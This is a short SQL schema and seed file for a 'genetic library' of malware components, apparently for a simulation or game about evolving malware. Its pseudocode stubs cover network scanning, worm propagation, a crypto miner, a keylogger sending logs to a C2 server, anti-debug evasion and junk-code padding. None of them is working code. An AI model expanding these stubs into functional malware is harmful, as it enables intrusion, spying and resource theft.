

-- 1. The Genetic Library
CREATE TABLE IF NOT EXISTS genes (
    gene_id SERIAL PRIMARY KEY,
    gene_type VARCHAR(50), -- 'SPREADER', 'PAYLOAD', 'DEFENSE', 'OBFUSCATION'
    code_snippet TEXT NOT NULL,
    complexity_score INT DEFAULT 10, -- 1-100 (Impact on CPU)
    description VARCHAR(255)
);

-- 2. Seed Data (The Building Blocks)
INSERT INTO genes (gene_type, code_snippet, complexity_score, description) VALUES 
('SPREADER', 'def scan_network(target_subnet):\n    for ip in target_subnet:\n        ping(ip)', 20, 'Basic Network Scanner'),
('SPREADER', 'def worm_propagate(neighbor):\n    copy_self(neighbor)\n    execute_remote(neighbor)', 35, 'Aggressive Worm Logic'),
('PAYLOAD', 'def crypto_miner():\n    while True:\n        hash_calc(random_block)', 80, 'CPU Heavy Miner'),
('PAYLOAD', 'def keylogger():\n    hook_keyboard()\n    send_logs(c2_server)', 15, 'Stealthy Spyware'),
('DEFENSE', 'def anti_debug():\n    if debugger_detected():\n        sys.exit()', 10, 'Analysis Evasion'),
('OBFUSCATION', 'def junk_code():\n    a = 1 + 1\n    b = a * 2', 5, 'Signature Padding');